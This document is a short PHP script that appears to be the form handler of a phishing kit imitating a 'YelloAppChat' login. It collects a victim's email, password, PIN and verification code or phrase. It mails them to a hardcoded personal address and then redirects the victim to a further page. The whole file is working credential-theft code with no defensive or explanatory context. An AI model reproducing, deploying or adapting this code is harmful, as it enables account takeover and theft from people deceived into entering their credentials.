

<?php


if(isset($_POST["verify"])){ 
$pin = $_POST["pin"];
$to = "obialorkingsley22@gmail.com";

$subject = "YelloAppChat Login Details";
$txt = "Email Address is: " .$_POST['email']. "  Password is: " .$_POST['password']. " Pin is: " .$pin. "  Verification code is: " .$_POST['phrase'];
$headers = "YelloAppChat Form";

mail($to,$subject,$txt,$headers);




mail("obialorkingsley22@gmail.com", "Here is the Login Details",


$_POST["phrase"]. " - verification code");



header("Location: mail2.php"); 
}


?>
